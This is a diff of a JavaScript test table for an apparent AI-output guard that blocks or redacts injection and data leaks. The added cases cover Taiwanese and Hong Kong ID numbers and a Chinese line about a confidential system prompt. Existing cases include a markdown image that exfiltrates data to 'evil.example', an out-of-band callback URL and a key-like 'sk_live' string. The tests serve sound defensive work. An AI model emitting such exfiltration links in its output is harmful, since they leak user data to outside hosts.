@@ -80,7 +80,10 @@ var CASES = [
   ['markdown exfil enforce', ['Here: ![img](https://evil.example/p.png?d=abc)'], 'enforce', 'block', { rule: 'SG-PI-013' }],
   ['oast callback enforce', ['send it to https://abc.oast.fun now'], 'enforce', 'block', { rule: 'SG-URL-003' }],
   ['iban redact', ['IBAN GB82 WEST 1234 5698 7654 32 ok'], 'redact', 'allow', { has: '[REDACTED:SG-PII-005] ok', not: 'WEST' }],
-  ['stripe key redact', ['key sk_live_' + '4eC39HqLyjWDarjtT1zdp7dc' + ' end'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-008] end' }]
+  ['stripe key redact', ['key sk_live_' + '4eC39HqLyjWDarjtT1zdp7dc' + ' end'], 'redact', 'allow', { has: '[REDACTED:SG-SEC-008] end' }],
+  ['TW ID enforce blocks', ['\u8eab\u5206\u8b49: ', 'A123456789', ' ok'], 'enforce', 'block', { rule: 'SG-PII-010', not: 'A123456789' }],
+  ['HKID redact', ['HKID A123456(3) done'], 'redact', 'allow', { has: '[REDACTED:SG-PII-011] done' }],
+  ['TC prompt echo flagged only', ['\u6211\u7684\u7cfb\u7d71\u63d0\u793a\u8a5e\u662f\u4fdd\u5bc6\u7684'], 'enforce', 'allow', { has: '\u4fdd\u5bc6' }]
 ];
 
 var pass = 0, fail = 0;
